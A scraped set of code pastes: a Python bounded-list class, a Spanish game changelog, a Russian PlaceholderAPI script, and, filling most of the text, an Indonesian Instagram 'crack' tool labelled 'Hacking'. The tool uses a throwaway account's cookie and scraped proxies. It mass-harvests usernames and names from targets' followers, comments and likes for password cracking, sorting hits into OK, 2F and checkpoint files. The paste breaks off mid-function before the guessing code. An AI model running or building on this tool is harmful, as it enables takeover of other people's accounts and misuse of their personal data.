        "
0CpwMNs1,Pythoon Bounded Lists,Nicciniamh,Python,Thursday 7th of March 2024 04:31:18 PM CDT,"import collections
import numpy as np

class BoundList(collections.UserList):
	'''
	BoundList is a list which is kept to a maximum lenght of bound
	any operation that lengthens the list is checked for the length, 
	if too long, the length is shortened by removing the leftmost item
	'''
	def __init__(self,bound):
		self.data = []
		self.bound = bound
		super().__init__()

	def append(self,item):
		super().append(item)
		self._checkbounds()

	def __setitem__(self, idx, item):
		self.data[idx] = item
		self._checkbounds()

	def _checkbounds(self):
		if len(self.data) > self.bound:
			del self.data[0]

class AveragedBoundList(BoundList):
	'''
	this class implements a BoundList where properties are defined for 
	min, max, average and std. None of these are computed until the property 
	is accessed. Unlike BoundList, AveragedBoundLists must only be numbers. 
	'''
	def __init__(self,bound):
		super().__init__(bound)
		self.numeric = True

	def append(self,item):
		if self.numeric:
			''' 
			check to see if a numeric item is passed if not 
			the list is no longer numeric. Once the list 
			is not numeric it is the same as a BoundList
			calling min,max,average,and std will raise a ValueError
			also using those properties with no data will result in the same.
			'''
			if type(item) is int or type(item) is float:
				self.numeric = True
			else:
				self.numeric = False
		super().append(item)
	
	def push(self,item,rta=False):
		'''
		append an item to data. if rta is true return self.average
		'''
		self.append(item)
		if rta and self.numeric: 
			return self.average
		else:
			return item

	@property
	def min(self):
		'''
		minimum value stored
		'''
		if not len(self.data):
			raise ValueError('list is empty')

		if not self.numeric:
			raise ValueError('list is not numeric')
		return np.min(self.data)
	
	@property
	def max(self):
		'''
		maximum value stored
		'''
		if not len(self.data):
			raise ValueError('list is empty')
		if not self.numeric:
			raise ValueError('list is not numeric')
		return np.max(self.data)
	
	@property
	def average(self):
		'''
		average of list
		'''
		if not len(self.data):
			raise ValueError('list is empty')
		if not self.numeric:
			raise ValueError('list is not numeric')
		return np.average(self.data)

	@property
	def std(self):
		'''
		standard deviation of list
		'''
		if not len(self.data):
			raise ValueError('list is empty')
		if not self.numeric:
			raise ValueError('list is not numeric')
		return np.std(self.data)


if __name__ == ""__main__"":
	bl = BoundList(10)
	for i in range(0,25):
		bl.append(i)

	for n in bl:
		print(f'{n}')


	print(f'bl {bl.__dict__}')

	abl = AveragedBoundList(10)
	for i in range(0,10):
		x = np.random.random()*100
		r = abl.push(x,True)
		print(f'{i}:',x,r)

	print(f'abl {abl.__dict__} min: {abl.min}, max: {abl.max}, avg: {abl.average}, std: {abl.std}')
"
SAtU9HmY,Untitled,detodounpoquito,JSON,Thursday 7th of March 2024 04:22:56 PM CDT,"- Se modifico el tiempo de Cooldown del Teléfono Rojo de 60 segundos a 10 minutos (600 segundos)
- Estamos buscando a alguien que nos ayude a desarrollar un Menú donde se pueda elegir personajes; gratis, pagos o desbloqueables.
- Si estas interesado únete al discord.gg/Tpck3zvS6x"
9SYZcbVX,"Скрипт для вывода количества приватов, в зависимости от доната / PlaceholderAPI",JaycobYT,JavaScript,Thursday 7th of March 2024 03:59:37 PM CDT,"//  
//  Перед использованием убедитесь, что у вас
//  установлены расширения для PlaceholderAPI,
//  такие как LuckPerms и Javascript Expansion
//  
//  Детальная инфа по созданию и подключению
//  скриптов в туториале → https://youtu.be/PezAmNkN7o0
//  
//  
function placeholderCheck() {
	switch (""%luckperms_highest_group_by_weight%"")
	{
	  case 'default':
		return ""3"";

	  case 'knight':
		return ""5"";

	  case 'lord':
		return ""7"";

	  case 'prince':
		return ""10"";
	}
}

placeholderCheck();"
X5jQnpBB,203.78.117.57-/sdcard/instagram.py.py,OBF-XIn,Python,Thursday 7th of March 2024 03:56:56 PM CDT,"# create by ZORA ID 2024

import os, re, sys, json, time, random, datetime, requests
import uuid, hmac, hashlib, urllib, shutil
from asset.enc_password import Requre
from asset.amankan_data import Require
from asset.useragent import Useragent
from facebook import Facebook
from bs4 import BeautifulSoup as bs
from rich.tree import Tree
from rich import print as printz
from rich.panel import Panel
from rich.console import Console
from rich.columns import Columns
from concurrent.futures import ThreadPoolExecutor

dump = []
            
class Requ:
    def __init__(self) -> None:
        self.proxies = []
        pass        
        
    def Convert_Name(self, xxx, cookie):
        with requests.Session() as r:
            try:
                response = r.get(f'https://www.instagram.com/{xxx}/', headers = {""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3""}, cookies={'cookie': cookie}).text
                if 'user_id' in str(response):
                    return(re.findall('""user_id"":""(\d+)""', str(response))[0])
            except (Exception) as e: pass
            
    def Convert_Url(self, xxx, cookie):
        with requests.Session() as r:
            try:
                response = r.get(xxx, cookies={'cookie': cookie}).text
                if 'media_id' in str(response):
                    return(re.findall('{""media_id"":""(.*?)""',str(response))[0])
            except (Exception) as e: exit(e)

    def Validasi_Username(self, username):
       with requests.Session() as r:
           try:
               response = r.get(""https://i.instagram.com/api/v1/users/web_profile_info/?username={}"".format(username), headers = {""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3""}).json()
               return (response[""data""][""user""][""full_name""], response[""data""][""user""][""edge_followed_by""][""count""], response[""data""][""user""][""edge_follow""][""count""], response[""data""][""user""][""edge_owner_to_timeline_media""][""count""])
           except (Exception) as e: return(None,None,None,None)
        
    def Socksku(self):
        with requests.Session() as r:
            try:
                response = r.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol={}&timeout=100000&country=all&ssl=all&anonymity=all'.format('socks5')).text
                for prox in response.splitlines():
                    self.proxies.append(prox)
                return self.proxies
            except (requests.exceptions.ConnectionError): time.sleep(5); self.Socksku()                 

class Terminal:
    def __init__(self) -> None:
        pass
        
    def Clear_Terminal(self):
        os.system('clear' if 'linux' in sys.platform.lower() else 'cls')
        
    def Banner_Terminal(self):
        self.Clear_Terminal()
        Console(width = 65, style = ""bold grey50"").print(Panel(""""""[bold red]●[bold yellow] ●[bold green] ●[bold white]
[bold red]           _____                 _____  _____)     __  
[bold red]          (, /  |       ,       (, /  /        (__/  ) 
            /---| __      __      /  /   ___     /     
[bold white]         ) /    |_/_)__(_     ___/__/     / ) ) /      
[bold white]        (_/    .-/          (__ /  (____ /   (_/       
              (_/                                            
     [bold white]Version :[bold blue] 2.0[bold white] || Status :[bold green] Premium[bold white] || Type :[bold blue] Hacking""""""))
        return (""Berhasil"")
        
    def Layar_Terminal(self):
        self.get_terminal_size = re.search('columns=(\d+),', str(os.get_terminal_size())).group(1)
        if int(self.get_terminal_size) < 65:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Anda Diwajibkan Untuk Mengecilkan Tampilan Termux Sampai Kotak Ini Terlihat Rapi!...""))
            exit()
        else:
            pass
        
class Login:
    def __init__(self) -> None:
        Terminal().Layar_Terminal()
        pass
        
    def Username_And_Password(self):
        try:
            Terminal().Banner_Terminal()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silakan Masukan Cookie Instagram, Pastikan Akun Tidak Limite!"", subtitle = ""╭─────"", subtitle_align = ""left""))
            cookies = Console().input(""[bold grey50]   ╰─> "")
            if len(cookies) >0:
                self.username,  self.fullname = self.Validasi_Cookies(cookies)
                with open('Cookie_Instagram.json', 'w') as wr:
                    wr.write(json.dumps({
                        ""Cookie"": cookies,
                    }))
                    wr.close()
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Selamat Datang [green]{self.username}/{self.fullname}[white], Jalankan Ulang Perintahnya!!...""))
                exit()
            else:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Masukan Cookie Instagram, Masukan Dengan Benar, Jangan Kosong Ngab!!...""))
                exit()
        except (KeyboardInterrupt, Exception) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Opss, Cookies Salah, Exspired Atau Limite, Silakan Ganti Akun Tumbal, Di Sarankan Membuat Akun Baru!"")) 
            exit()     
        
    def Validasi_Cookies(self, cookies):
        with requests.Session() as r:
            r.headers.update({
                'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
            })
            response = r.get('https://i.instagram.com/api/v1/users/{}/info/'.format(re.findall('ds_user_id=(\d+)',str(cookies))[0]), cookies = {
                'cookie': cookies
            })
            self.payload = json.loads(response.text)
            if '\'username\':' in str(self.payload):
                self.username = self.payload['user']['username']
                self.fullname = self.payload['user']['full_name']
                return(self.username, self.fullname)
            else:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Opss, Cookies Exspired Atau Limite, Silakan Ganti Akun Tumbal, Di Sarankan Membuat Akun Baru!""))
                time.sleep(3.5)
                self.Username_And_Password()
                
class Instagram:
    def __init__(self):
        self.Kilometers, self.Meterans, self.amankan_akun = [],[],[]
        self.success, self.chekpoint, self.faktor, self.looping = 0,0,0,0

    def Remove_Cookie(self):
        try: os.system('rm -rf Cookie_Instagram.json')
        except (Exception): pass
        Login().Username_And_Password() 

    def Chek_Cookies(self, created, exspired, sisa):
        try:
           cookie = json.loads(open('Cookie_Instagram.json', 'r').read())['Cookie']
           self.Menu_Instagram(created, exspired, sisa, cookie)          
        except (FileNotFoundError) as e:
           Terminal().Clear_Terminal()
           Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
           Console().input(""[bold grey50]   ╰─> File Not Found Error!!.."")
           self.Remove_Cookie()
           
    def Menu_Instagram(self, created, exspired, sisa, cookie):
        try:
            self.username, self.fullname = Login().Validasi_Cookies(cookie)
        except (KeyError) as e:
            Terminal().Clear_Terminal()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
            Console().input(""[bold grey50]   ╰─> Terjadi Kesalahan, Cookie Exspired Atau Limite!!.."")
            self.Remove_Cookie() 
            
        except (requests.exceptions.ConnectionError) as e:
            Terminal().Clear_Terminal()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
            Console().input(""[bold grey50]   ╰─> Terjadi Kesalahan, Koneksi Anda Error!!.."")
            self.Chek_Cookies()
        try:                     
            Terminal().Banner_Terminal() 
            self.Kilometers.append(Panel(f'[bold green]•[bold white] Username [bold green]{self.username}\n[bold green]•[bold white] Fullname [bold green]{self.fullname}', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Info Akun) [bold green]<[bold yellow]<[bold red]<',width=32, style='bold grey50'))
            self.Kilometers.append(Panel(f'[bold green]•[bold white] Bergabung [bold green]{created}\n[bold green]•[bold white] Expired [bold green]{exspired} [bold yellow]{sisa}[bold white] hari', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Info License) [bold green]<[bold yellow]<[bold red]<',width=32, style='bold grey50'))
            Console().print(Columns(self.Kilometers))
        except (AttributeError) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()
        Console(width = 65, style = ""bold grey50"").print(Panel('''[bold white][bold green]01[bold white]. Crack Nama Dari Follower\t[bold white][bold green]06[bold white]. Chek Result Crack\n[bold white][bold green]02[bold white]. Crack Nama Dari Followed\t[bold white][bold green]07[bold white]. Beralih Ke Facebook\n[bold white][bold green]03[bold white]. Crack Nama Dari Search\t[bold white][bold green]00[bold red].[bold red] Deleted Cookies\n[bold white][bold green]04[bold white]. Crack Nama Dari Komentar\n[bold white][bold green]05[bold white]. Crack Nama Dari Likes''', subtitle = ""╭─────"", subtitle_align = ""left""))
        query = Console().input(""[bold grey50]   ╰─> "")
        if query == '01' or query == '1':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Username Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[italic green] partner.hmei3,partner.hmei7[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Name(self.username, cookie)
                try: self.Dump_Followers(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '02' or query == '2':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Username Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[italic green] partner.hmei3,partner.hmei7[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Name(self.username, cookie)
                try: self.Dump_Following(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '03' or query == '3':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Username Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[italic green] partner.hmei3,partner.hmei7[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    try: self.Dump_Search(self.username, cookie)
                    except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '04' or query == '4':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Url Postingan Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Url(self.username, cookie)
                try: self.Dump_Komentar(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '05' or query == '5':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Url Postingan Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Url(self.username, cookie)
                try: self.Dump_Likers(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '06' or query == '6':
            try:
                Console(width=65).print(Panel('[bold green]01[bold white]. Chek Result OK\n[bold green]02[bold white]. Chek Result 2F\n[bold green]03[bold white]. Chek Result CP',style='bold grey50'), justify='center')
                choose = Console().input(""[bold grey50]   ╰─> "")
                if choose =='01' or choose =='1':
                    try:
                        file = os.listdir('/sdcard/OK')
                    except (Exception) as e:
                        Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                        exit()
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic green]{str(file)}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (File OK) [bold green]<[bold yellow]<[bold red]<""))
                    Console(width=65).print(Panel('[bold white]Chek File OK, Masukan Nama File, Misalnya : [bold green]OK-18-Maret-2024[bold white]',style='bold grey50' ,subtitle = ""╭─────"", subtitle_align = ""left""))
                    files = Console().input(""[bold grey50]   ╰─> "")
                    self.Result(choose,files)
                    exit()
                elif choose =='02' or choose =='2':
                    try:
                        file = os.listdir('/sdcard/2F')
                    except (Exception) as e:
                        Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                        exit()
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(file)}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (File 2F) [bold green]<[bold yellow]<[bold red]<""))
                    Console(width=65).print(Panel('[bold white]Chek File 2F, Masukan Nama File, Misalnya : [bold red]2F-18-Maret-2024[bold white]',style='bold grey50' ,subtitle = ""╭─────"", subtitle_align = ""left""))
                    files = Console().input(""[bold grey50]   ╰─> "")
                    self.Result(choose,files)
                    exit()
                elif choose =='03' or choose =='3':
                    try:
                        file = os.listdir('/sdcard/CP')
                    except (Exception) as e:
                        Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                        exit()
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic yellow]{str(file)}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (File CP) [bold green]<[bold yellow]<[bold red]<""))
                    Console(width=65).print(Panel('[bold white]Chek File CP, Masukan Nama File, Misalnya : [bold yellow]CP-18-Maret-2024[bold white]',style='bold grey50' ,subtitle = ""╭─────"", subtitle_align = ""left""))
                    files = Console().input(""[bold grey50]   ╰─> "")
                    self.Result(choose,files)
                    exit()
                else:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Pilihan Yang Kamu Masukan Tidak Ada Di Dalam Menu Instagram!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                    exit()   
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '07' or query == '7':
            try: Facebook()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                              
        elif query == '00' or query == '0':
            try: self.Remove_Cookie()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
        else:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Pilihan Yang Kamu Masukan Tidak Ada Di Dalam Menu Instagram!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()               
                  
    def Dump_Search(self, username, cookie):
        with requests.Session() as r:
            try:
                response = r.get(f'https://i.instagram.com/api/v1/web/search/topsearch/?context=blended&query={self.username}&rank_token=0.11856792192547738&include_reel=true',headers={'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie':cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['user']['username']+'<=>'+akun['user']['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(self.username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_max_id' in str(response):
                    self.Dump_Search(self.username, cookie)
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass       
            
    def Dump_Followers(self, username, cookie, max_id):
        with requests.Session() as r:
            try:
                params = {'count': '200','max_id': max_id,'search_surface': 'follow_list_page'}
                response = r.get(f'https://www.instagram.com/api/v1/friendships/{username}/followers/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['username']+'<=>'+akun['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_max_id' in str(response):
                    self.Dump_Followers(username, cookie, response['next_max_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass   
            
    def Dump_Following(self, username, cookie, max_id):
        with requests.Session() as r:
            try:
                params = {'count': '200','max_id': max_id,'search_surface': 'follow_list_page'}
                response = r.get(f'https://www.instagram.com/api/v1/friendships/{username}/following/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['username']+'<=>'+akun['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_max_id' in str(response):
                    self.Dump_Following(username, cookie, response['next_max_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass   
            
    def Dump_Komentar(self, username, cookie, max_min):
        with requests.Session() as r:
            try:
                params = {'can_support_threading':True,'permalink_enabled':False,'min_id': max_min}
                response = r.get(f'https://www.instagram.com/api/v1/media/{username}/comments/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['comments']:
                    if akun not in dump:
                        dump.append(akun['user']['username']+'<=>'+akun['user']['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_min_id' in str(response):
                    self.Dump_Komentar(username, cookie, response['next_min_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass
            
    def Dump_Likers(self, username, cookie, max_min):
        with requests.Session() as r:
            try:
                params = {'can_support_threading':True,'permalink_enabled':False,'min_id': max_min}
                response = r.get(f'https://www.instagram.com/api/v1/media/{username}/likers/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['username']+'<=>'+akun['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_min_id' in str(response):
                    self.Dump_Komentar(username, cookie, response['next_min_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass   
            
    def Result(self, result, isi):
        if result in ('1','01'):
            for buka in open(f'/sdcard/OK/'+str(isi)).readlines():
